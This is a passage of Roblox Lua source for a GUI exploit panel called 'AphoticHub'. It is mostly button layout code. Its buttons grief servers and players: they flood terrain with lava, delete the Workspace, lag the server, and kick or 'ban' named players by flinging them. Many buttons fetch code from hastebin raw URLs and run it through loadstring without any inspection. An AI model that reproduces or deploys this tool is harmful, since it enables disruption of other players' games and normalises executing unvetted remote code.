local AphoticHub = Instance.new("ScreenGui")
GenerateTower.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
GenerateTower.Position = UDim2.new(0.658136427, 0, 0.528695047, 0)
GenerateTower.Size = UDim2.new(0, 93, 0, 18)
GenerateTower.Font = Enum.Font.SourceSans
GenerateTower.Text = "Tower Generator"
GenerateTower.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
GenerateTower.TextSize = 14
GenerateTower.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet(('https://hastebin.com/raw/nevalilini.lua'),true))()
end)

Graveyard.Name = "Graveyard"
Graveyard.Parent = WorldGenerationFrame
Graveyard.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
Graveyard.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
Graveyard.Position = UDim2.new(0.0401962548, 0, 0.717141986, 0)
Graveyard.Size = UDim2.new(0, 93, 0, 18)
Graveyard.Font = Enum.Font.SourceSans
Graveyard.Text = "Graveyard"
Graveyard.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
Graveyard.TextSize = 14
Graveyard.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet(('https://hastebin.com/raw/siviyahimo.go'),true))()
end)

HackedLobby.Name = "HackedLobby"
HackedLobby.Parent = WorldGenerationFrame
HackedLobby.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
HackedLobby.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
HackedLobby.Position = UDim2.new(0.659442723, 0, 0.0402351022, 0)
HackedLobby.Size = UDim2.new(0, 93, 0, 18)
HackedLobby.Font = Enum.Font.SourceSans
HackedLobby.Text = "Hacked Lobby"
HackedLobby.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
HackedLobby.TextSize = 14
HackedLobby.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet(('https://hastebin.com/raw/cukifuganu.bash'),true))()
end)

Jungle.Name = "Jungle"
Jungle.Parent = WorldGenerationFrame
Jungle.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
Jungle.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
Jungle.Position = UDim2.new(0.659442723, 0, 0.139208496, 0)
Jungle.Size = UDim2.new(0, 93, 0, 18)
Jungle.Font = Enum.Font.SourceSans
Jungle.Text = "Jungle"
Jungle.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
Jungle.TextSize = 14
Jungle.MouseButton1Click:Connect(function()
	loadstring(game.HttpGet(('https://hastebin.com/raw/iqojarijir.lua'),true))()
end)

KrustyKrab.Name = "KrustyKrab"
KrustyKrab.Parent = WorldGenerationFrame
KrustyKrab.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
KrustyKrab.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
KrustyKrab.Position = UDim2.new(0.659442723, 0, 0.232346728, 0)
KrustyKrab.Size = UDim2.new(0, 93, 0, 18)
KrustyKrab.Font = Enum.Font.SourceSans
KrustyKrab.Text = "Krusty Krab"
KrustyKrab.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
KrustyKrab.TextSize = 14
KrustyKrab.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet(('https://hastebin.com/raw/kofesoyebe.vbs'),true))()
end)

Maze.Name = "Maze"
Maze.Parent = WorldGenerationFrame
Maze.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
Maze.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
Maze.Position = UDim2.new(0.659442723, 0, 0.331034243, 0)
Maze.Size = UDim2.new(0, 93, 0, 18)
Maze.Font = Enum.Font.SourceSans
Maze.Text = "Maze"
Maze.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
Maze.TextSize = 14
Maze.MouseButton1Click:Connect(function()
	loadstring(game.HttpGet(('https://hastebin.com/raw/luvejoweyi.lua'),true))()
end)

SnowyMountain.Name = "SnowyMountain"
SnowyMountain.Parent = WorldGenerationFrame
SnowyMountain.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
SnowyMountain.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
SnowyMountain.Position = UDim2.new(0.659442723, 0, 0.430007458, 0)
SnowyMountain.Size = UDim2.new(0, 93, 0, 18)
SnowyMountain.Font = Enum.Font.SourceSans
SnowyMountain.Text = "Snowy Mountain"
SnowyMountain.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
SnowyMountain.TextSize = 14
SnowyMountain.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet(('https://hastebin.com/raw/ocovawuxup.lua'),true))()
end)

OldForest.Name = "OldForest"
OldForest.Parent = WorldGenerationFrame
OldForest.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
OldForest.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
OldForest.Position = UDim2.new(0.659442723, 0, 0.623431861, 0)
OldForest.Size = UDim2.new(0, 93, 0, 18)
OldForest.Font = Enum.Font.SourceSans
OldForest.Text = "Old Forest"
OldForest.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
OldForest.TextSize = 14
OldForest.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet(('https://hastebin.com/raw/walepumeve.php'),true))()
end)

Tornado.Name = "Tornado"
Tornado.Parent = WorldGenerationFrame
Tornado.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
Tornado.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
Tornado.Position = UDim2.new(0.659442723, 0, 0.717141986, 0)
Tornado.Size = UDim2.new(0, 93, 0, 18)
Tornado.Font = Enum.Font.SourceSans
Tornado.Text = "Tornado"
Tornado.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
Tornado.TextSize = 14
Tornado.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet(('https://hastebin.com/raw/yoyawujiyo.lua'),true))()
end)

ServerFrame.Name = "ServerFrame"
ServerFrame.Parent = Mainframe
ServerFrame.BackgroundColor3 = Color3.new(0, 0, 0)
ServerFrame.BorderColor3 = Color3.new(1, 1, 1)
ServerFrame.Size = UDim2.new(0, 301, 0, 190)
ServerFrame.Visible = false

UnanchorWSpart.Name = "UnanchorWSpart"
UnanchorWSpart.Parent = ServerFrame
UnanchorWSpart.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
UnanchorWSpart.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
UnanchorWSpart.Position = UDim2.new(0.322683245, 0, 0.736842096, 0)
UnanchorWSpart.Size = UDim2.new(0, 90, 0, 17)
UnanchorWSpart.Font = Enum.Font.SourceSans
UnanchorWSpart.Text = "Unanchor WS Part"
UnanchorWSpart.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
UnanchorWSpart.TextSize = 13
UnanchorWSpart.MouseButton1Click:Connect(function()
	game:GetService'Workspace'[ServerTextBox.Text].Anchored = false
end)

PrintWS.Name = "PrintWS"
PrintWS.Parent = ServerFrame
PrintWS.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
PrintWS.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
PrintWS.Position = UDim2.new(0.322683245, 0, 0.852631569, 0)
PrintWS.Size = UDim2.new(0, 90, 0, 17)
PrintWS.Font = Enum.Font.SourceSans
PrintWS.Text = "Print WS"
PrintWS.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
PrintWS.TextSize = 14
PrintWS.MouseButton1Click:Connect(function()
	for _,v in next, workspace:GetChildren() do
print(v.Name)
end
end)

AnchorWSpart.Name = "AnchorWSpart"
AnchorWSpart.Parent = ServerFrame
AnchorWSpart.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
AnchorWSpart.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
AnchorWSpart.Position = UDim2.new(0.0232558139, 0, 0.852631569, 0)
AnchorWSpart.Size = UDim2.new(0, 90, 0, 17)
AnchorWSpart.Font = Enum.Font.SourceSans
AnchorWSpart.Text = "Anchor WS Part"
AnchorWSpart.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
AnchorWSpart.TextSize = 14
AnchorWSpart.MouseButton1Click:Connect(function()
	game:GetService'Workspace'[ServerTextBox.Text].Anchored = true
end)

DeleteWSPart.Name = "DeleteWSPart"
DeleteWSPart.Parent = ServerFrame
DeleteWSPart.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
DeleteWSPart.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
DeleteWSPart.Position = UDim2.new(0.0232558139, 0, 0.736842096, 0)
DeleteWSPart.Size = UDim2.new(0, 90, 0, 17)
DeleteWSPart.Font = Enum.Font.SourceSans
DeleteWSPart.Text = "Delete WS part"
DeleteWSPart.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
DeleteWSPart.TextSize = 14
DeleteWSPart.MouseButton1Click:Connect(function()
	game:GetService'Workspace'[ServerTextBox.Text]:Destroy()
end)

DeleteWS.Name = "DeleteWS"
DeleteWS.Parent = ServerFrame
DeleteWS.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
DeleteWS.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
DeleteWS.Position = UDim2.new(0.0232558139, 0, 0.621052623, 0)
DeleteWS.Size = UDim2.new(0, 90, 0, 17)
DeleteWS.Font = Enum.Font.SourceSans
DeleteWS.Text = "Delete WS"
DeleteWS.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
DeleteWS.TextSize = 14
DeleteWS.MouseButton1Click:Connect(function()
	game.Workspace:Destroy()
end)

_666.Name = "666"
_666.Parent = ServerFrame
_666.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
_666.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
_666.Position = UDim2.new(0.322683245, 0, 0.621052623, 0)
_666.Size = UDim2.new(0, 90, 0, 17)
_666.Font = Enum.Font.SourceSans
_666.Text = "666"
_666.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
_666.TextSize = 14
_666.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet(('https://hastebin.com/raw/sazapegifu.coffeescript'),true))()
end)

PrintMaterials.Name = "PrintMaterials"
PrintMaterials.Parent = ServerFrame
PrintMaterials.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
PrintMaterials.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
PrintMaterials.Position = UDim2.new(0.322683245, 0, 0.5, 0)
PrintMaterials.Size = UDim2.new(0, 90, 0, 17)
PrintMaterials.Font = Enum.Font.SourceSans
PrintMaterials.Text = "Print Materials"
PrintMaterials.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
PrintMaterials.TextSize = 14
PrintMaterials.MouseButton1Click:Connect(function()
	print("Grass, Sand, Rock, Water, Ground, Sandstone, Slate, Snow, Mud, Brick, Concrete, Glacier, Wood Planks, Ceacked Lava, Basalt, Ice, Salt, Cobblestone, Limestone, Asphalt, Leafy Grass, Pavement")
end)

FloodMaterial.Name = "FloodMaterial "
FloodMaterial.Parent = ServerFrame
FloodMaterial.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
FloodMaterial.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
FloodMaterial.Position = UDim2.new(0.0232558139, 0, 0.5, 0)
FloodMaterial.Size = UDim2.new(0, 90, 0, 17)
FloodMaterial.Font = Enum.Font.SourceSans
FloodMaterial.Text = "Flood (material)"
FloodMaterial.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
FloodMaterial.TextSize = 14
FloodMaterial.MouseButton1Click:Connect(function()
	local region = Region3.new(Vector3.new(-1250,0,-1250), Vector3.new(1250,18,1250))
region = region:ExpandToGrid(4)
game.Workspace.Terrain:FillRegion(region, 4, Enum.Material[ServerTextBox.Text])
end)

FloodWater.Name = "FloodWater"
FloodWater.Parent = ServerFrame
FloodWater.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
FloodWater.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
FloodWater.Position = UDim2.new(0.0232558139, 0, 0.384210527, 0)
FloodWater.Size = UDim2.new(0, 90, 0, 17)
FloodWater.Font = Enum.Font.SourceSans
FloodWater.Text = "Flood Water"
FloodWater.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
FloodWater.TextSize = 14
FloodWater.MouseButton1Click:Connect(function()
	local region = Region3.new(Vector3.new(-1250,0,-1250), Vector3.new(1250,18,1250))
region = region:ExpandToGrid(4)
game.Workspace.Terrain:FillRegion(region, 4, Enum.Material.Water)
end)

FloodLava.Name = "FloodLava"
FloodLava.Parent = ServerFrame
FloodLava.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
FloodLava.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
FloodLava.Position = UDim2.new(0.322259128, 0, 0.384210527, 0)
FloodLava.Size = UDim2.new(0, 90, 0, 17)
FloodLava.Font = Enum.Font.SourceSans
FloodLava.Text = "Flood Lava"
FloodLava.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
FloodLava.TextSize = 14
FloodLava.MouseButton1Click:Connect(function()
	local region = Region3.new(Vector3.new(-1250,0,-1250), Vector3.new(1250,18,1250))
region = region:ExpandToGrid(4)
game.Workspace.Terrain:FillRegion(region, 4, Enum.Material.CrackedLava)
end)

LagServer.Name = "LagServer"
LagServer.Parent = ServerFrame
LagServer.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
LagServer.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
LagServer.Position = UDim2.new(0.312292367, 0, 0.273684204, 0)
LagServer.Size = UDim2.new(0, 93, 0, 17)
LagServer.Font = Enum.Font.SourceSans
LagServer.Text = "Lag Server"
LagServer.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
LagServer.TextSize = 14
LagServer.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet(('https://hastebin.com/raw/ozuyalidup.lua'),true))()
end)

PepeDestruction.Name = "PepeDestruction"
PepeDestruction.Parent = ServerFrame
PepeDestruction.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
PepeDestruction.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
PepeDestruction.Position = UDim2.new(0.0232558139, 0, 0.273684174, 0)
PepeDestruction.Size = UDim2.new(0, 90, 0, 17)
PepeDestruction.Font = Enum.Font.SourceSans
PepeDestruction.Text = "Pepe Destruction"
PepeDestruction.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
PepeDestruction.TextSize = 14
PepeDestruction.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet(('https://hastebin.com/raw/jeyakuvodi.vbs'),true))()
end)

UnlockWS.Name = "UnlockWS"
UnlockWS.Parent = ServerFrame
UnlockWS.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
UnlockWS.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
UnlockWS.Position = UDim2.new(0.0232558139, 0, 0.157894731, 0)
UnlockWS.Size = UDim2.new(0, 90, 0, 17)
UnlockWS.Font = Enum.Font.SourceSans
UnlockWS.Text = "Unlock WS"
UnlockWS.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
UnlockWS.TextSize = 14
UnlockWS.MouseButton1Click:Connect(function()
	for i,v in pairs(game.Workspace:GetChildren()) do 
if v.ClassName == 'Part' then 
v.Locked = false 
end end
end)

LockWS.Name = "LockWS"
LockWS.Parent = ServerFrame
LockWS.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
LockWS.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
LockWS.Position = UDim2.new(0.322259128, 0, 0.157894731, 0)
LockWS.Size = UDim2.new(0, 90, 0, 17)
LockWS.Font = Enum.Font.SourceSans
LockWS.Text = "Lock WS"
LockWS.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
LockWS.TextSize = 14
LockWS.MouseButton1Click:Connect(function()
	function FUNCTION(a)
if (a.className == "Part") or (a.className == "Seat") or (a.className == "SpawnLocation") then
a.Locked= true
end
local b = a:GetChildren()
for i=1,#b do
FUNCTION(b[i])
end
end

FUNCTION(game.workspace)
end)

AnchorWS.Name = "AnchorWS"
AnchorWS.Parent = ServerFrame
AnchorWS.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
AnchorWS.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
AnchorWS.Position = UDim2.new(0.312292367, 0, 0.042105265, 0)
AnchorWS.Size = UDim2.new(0, 93, 0, 17)
AnchorWS.Font = Enum.Font.SourceSans
AnchorWS.Text = "Anchor WS"
AnchorWS.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
AnchorWS.TextSize = 14
AnchorWS.MouseButton1Click:Connect(function()
		function FUNCTION(a)
if (a.className == "Part") or (a.className == "Seat") or (a.className == "SpawnLocation") then
a.Anchored = true
end
local b = a:GetChildren()
for i=1,#b do
FUNCTION(b[i])
end
end

FUNCTION(game.workspace)
end)

UnanchorWS.Name = "UnanchorWS"
UnanchorWS.Parent = ServerFrame
UnanchorWS.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
UnanchorWS.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
UnanchorWS.Position = UDim2.new(0.0232558139, 0, 0.042105265, 0)
UnanchorWS.Size = UDim2.new(0, 90, 0, 17)
UnanchorWS.Font = Enum.Font.SourceSans
UnanchorWS.Text = "Unanchor WS"
UnanchorWS.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
UnanchorWS.TextSize = 14
UnanchorWS.MouseButton1Click:Connect(function()
	function FUNCTION(a)
if (a.className == "Part") or (a.className == "Seat") or (a.className == "SpawnLocation") then
a.Anchored = false
end
local b = a:GetChildren()
for i=1,#b do
FUNCTION(b[i])
end
end

FUNCTION(game.workspace)
end)

ServerTextBox.Name = "ServerTextBox"
ServerTextBox.Parent = ServerFrame
ServerTextBox.BackgroundColor3 = Color3.new(0.388235, 0.388235, 0.388235)
ServerTextBox.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
ServerTextBox.Position = UDim2.new(0.644518256, 0, 0.042105265, 0)
ServerTextBox.Size = UDim2.new(0, 99, 0, 17)
ServerTextBox.Font = Enum.Font.SourceSans
ServerTextBox.Text = "Input"
ServerTextBox.TextColor3 = Color3.new(0, 0, 0)
ServerTextBox.TextSize = 14

ServerFrameInfo.Name = "ServerFrameInfo"
ServerFrameInfo.Parent = ServerFrame
ServerFrameInfo.BackgroundColor3 = Color3.new(0.282353, 0.282353, 0.282353)
ServerFrameInfo.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
ServerFrameInfo.Position = UDim2.new(0.644518256, 0, 0.157894731, 0)
ServerFrameInfo.Size = UDim2.new(0, 99, 0, 149)
ServerFrameInfo.Font = Enum.Font.SourceSans
ServerFrameInfo.Text = "To make a custom flood, put a material name in the text box and then click \"Flood (material)\". Do the same to Delete, Anchor, or unanchor a WS part, but put the specific item to effect in the text box."
ServerFrameInfo.TextColor3 = Color3.new(0, 0, 0)
ServerFrameInfo.TextScaled = true
ServerFrameInfo.TextSize = 14
ServerFrameInfo.TextWrapped = true

PlayersFrame.Name = "PlayersFrame"
PlayersFrame.Parent = Mainframe
PlayersFrame.BackgroundColor3 = Color3.new(0, 0, 0)
PlayersFrame.BorderColor3 = Color3.new(1, 1, 1)
PlayersFrame.Size = UDim2.new(0, 301, 0, 190)
PlayersFrame.Visible = false

NumberBox.Name = "NumberBox"
NumberBox.Parent = PlayersFrame
NumberBox.BackgroundColor3 = Color3.new(0.388235, 0.388235, 0.388235)
NumberBox.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
NumberBox.Position = UDim2.new(0.671096385, 0, 0.0473684222, 0)
NumberBox.Size = UDim2.new(0, 90, 0, 19)
NumberBox.Font = Enum.Font.SourceSans
NumberBox.Text = "Number"
NumberBox.TextColor3 = Color3.new(0, 0, 0)
NumberBox.TextSize = 14

Ban.Name = "Ban"
Ban.Parent = PlayersFrame
Ban.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
Ban.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
Ban.Position = UDim2.new(0.0282392018, 0, 0.247368425, 0)
Ban.Size = UDim2.new(0, 90, 0, 19)
Ban.Font = Enum.Font.SourceSans
Ban.Text = "Ban"
Ban.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
Ban.TextSize = 14
Ban.MouseButton1Click:Connect(function()
	local bannedplr = (PlayerNameBox.Text)
local waittime = 4
function KICK(PLAYER_KICK)
if PLAYER_KICK.Character:FindFirstChild('Humanoid') then
local KICK_1         = Instance.new('SkateboardPlatform', PLAYER_KICK.Character)
KICK_1.Name          = ''
KICK_1.CFrame        = CFrame.new(math.random(-1000, 1000), 1000, math.random(-1000, 1000))
KICK_1.CanCollide    = false
KICK_1.Anchored      = false
KICK_1.Transparency  = 1
KICK_1.Size          = Vector3.new(5, 1, 5)

wait(0.2)

local WELD_1  = Instance.new('Weld', game.Workspace)
WELD_1.Name   = ''
WELD_1.Part0  = PLAYER_KICK.Character.Torso
WELD_1.Part1  = KICK_1
WELD_1.C0     = CFrame.new(0, -500, 0)

PLAYER_KICK.Character.Humanoid.WalkSpeed = 0
PLAYER_KICK.Character.Humanoid.Jump = true

wait(0.5)

KICK_1.Anchored = true
WELD_1:remove()

print('REMOVED : ' .. PLAYER_KICK.Name)
end
end

KICK(game.Players:FindFirstChild(bannedplr))

game.Players.PlayerAdded:connect(function(plr)
wait(waittime)
if plr.Name == bannedplr then
KICK(plr)
end
end)
end)

Kick.Name = "Kick"
Kick.Parent = PlayersFrame
Kick.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
Kick.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
Kick.Position = UDim2.new(0.0282392018, 0, 0.371840179, 0)
Kick.Size = UDim2.new(0, 90, 0, 19)
Kick.Font = Enum.Font.SourceSans
Kick.Text = "Kick"
Kick.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
Kick.TextSize = 14
Kick.MouseButton1Click:Connect(function()
	game.Players[PlayerNameBox.Text]:remove()
end)

Textbutton.Name = "Textbutton"
Textbutton.Parent = PlayersFrame
Textbutton.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
Textbutton.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
Textbutton.Position = UDim2.new(0.0282392018, 0, 0.491125584, 0)
Textbutton.Size = UDim2.new(0, 90, 0, 19)
Textbutton.Font = Enum.Font.SourceSans
Textbutton.Text = "Punish"
Textbutton.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
Textbutton.TextSize = 14
Textbutton.MouseButton1Click:Connect(function()
	game.Workspace[PlayerNameBox.Text]:remove()
end)

FFall.Name = "FFall"
FFall.Parent = PlayersFrame
FFall.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
FFall.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
FFall.Position = UDim2.new(0.671542108, 0, 0.247368425, 0)
FFall.Size = UDim2.new(0, 90, 0, 19)
FFall.Font = Enum.Font.SourceSans
FFall.Text = "FF all"
FFall.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
FFall.TextSize = 14
FFall.MouseButton1Click:Connect(function()
	for i, v in pairs(game.Players:GetPlayers()) do
       
 
ff = Instance.new("ForceField", v.Character)
 
 
end
end)

ChangeHealth.Name = "ChangeHealth"
ChangeHealth.Parent = PlayersFrame
ChangeHealth.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
ChangeHealth.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
ChangeHealth.Position = UDim2.new(0.0282392018, 0, 0.734882832, 0)
ChangeHealth.Size = UDim2.new(0, 90, 0, 19)
ChangeHealth.Font = Enum.Font.SourceSans
ChangeHealth.Text = "Change Health"
ChangeHealth.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
ChangeHealth.TextSize = 14
ChangeHealth.MouseButton1Click:Connect(function()
	game.Workspace[PlayerNameBox.Text].Humanoid.MaxHealth = (NumberBox.Text)
end)

ChangeSpeed.Name = "ChangeSpeed"
ChangeSpeed.Parent = PlayersFrame
ChangeSpeed.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
ChangeSpeed.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
ChangeSpeed.Position = UDim2.new(0.0282392018, 0, 0.859354615, 0)
ChangeSpeed.Size = UDim2.new(0, 90, 0, 19)
ChangeSpeed.Font = Enum.Font.SourceSans
ChangeSpeed.Text = "Change Speed"
ChangeSpeed.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
ChangeSpeed.TextSize = 14
ChangeSpeed.MouseButton1Click:Connect(function()
	game.Workspace[PlayerNameBox.Text].Humanoid.WalkSpeed = (NumberBox.Text)
end)

PlayerNameBox.Name = "PlayerNameBox"
PlayerNameBox.Parent = PlayersFrame
PlayerNameBox.BackgroundColor3 = Color3.new(0.388235, 0.388235, 0.388235)
PlayerNameBox.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
PlayerNameBox.Position = UDim2.new(0.35215947, 0, 0.0473684222, 0)
PlayerNameBox.Size = UDim2.new(0, 90, 0, 19)
PlayerNameBox.Font = Enum.Font.SourceSans
PlayerNameBox.Text = "Player Name"
PlayerNameBox.TextColor3 = Color3.new(0, 0, 0)
PlayerNameBox.TextSize = 14

LeaderboardStatBox.Name = "LeaderboardStatBox"
LeaderboardStatBox.Parent = PlayersFrame
LeaderboardStatBox.BackgroundColor3 = Color3.new(0.388235, 0.388235, 0.388235)
LeaderboardStatBox.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
LeaderboardStatBox.Position = UDim2.new(0.0299003311, 0, 0.0473684222, 0)
LeaderboardStatBox.Size = UDim2.new(0, 90, 0, 19)
LeaderboardStatBox.Font = Enum.Font.SourceSans
LeaderboardStatBox.Text = "Stat Name"
LeaderboardStatBox.TextColor3 = Color3.new(0, 0, 0)
LeaderboardStatBox.TextSize = 14

ChangeJumpPower.Name = "ChangeJumpPower"
ChangeJumpPower.Parent = PlayersFrame
ChangeJumpPower.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
ChangeJumpPower.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
ChangeJumpPower.Position = UDim2.new(0.351713747, 0, 0.247368425, 0)
ChangeJumpPower.Size = UDim2.new(0, 90, 0, 19)
ChangeJumpPower.Font = Enum.Font.SourceSans
ChangeJumpPower.Text = "Change Jump Power"
ChangeJumpPower.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
ChangeJumpPower.TextScaled = true
ChangeJumpPower.TextSize = 14
ChangeJumpPower.TextWrapped = true
ChangeJumpPower.MouseButton1Click:Connect(function()
	game.Workspace[PlayerNameBox.Text].Humanoid.JumpPower = (NumberBox.Text)
end)

ChangeLeaderboardStat.Name = "ChangeLeaderboardStat"
ChangeLeaderboardStat.Parent = PlayersFrame
ChangeLeaderboardStat.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
ChangeLeaderboardStat.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
ChangeLeaderboardStat.Position = UDim2.new(0.351713747, 0, 0.371840179, 0)
